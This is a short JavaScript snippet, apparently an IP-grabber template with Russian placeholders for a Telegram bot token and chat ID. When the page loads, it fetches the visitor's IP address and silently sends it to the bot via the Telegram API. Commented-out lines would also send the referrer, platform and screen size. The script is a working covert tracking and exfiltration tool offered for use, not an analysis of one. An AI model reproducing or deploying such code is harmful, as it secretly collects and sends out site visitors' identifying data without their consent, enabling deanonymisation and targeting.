let info = new Userinfo();
const token = "ТОКЕН СЮДА";
const tgid = "АЙДИ СЮДА"

function sendMessage(text) {
	let url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + tgid + '&text=' + text;
	let xhttp = new XMLHttpRequest();

	xhttp.open("GET", url, true);
	xhttp.send();
}


async function getInfo() {
    //sendMessage('Перешел от: ' + info.referrer());
    //sendMessage('Платформа: ' + info.browserInfo().platform);
    //sendMessage('Разрешение экрана: ' + String(info.sizeScreen().width) + 'x' + String(info.sizeScreen().height));
    ipobject = (await info.ip());
    sendMessage('IP адрес: ' + ipobject)
	
}

getInfo();
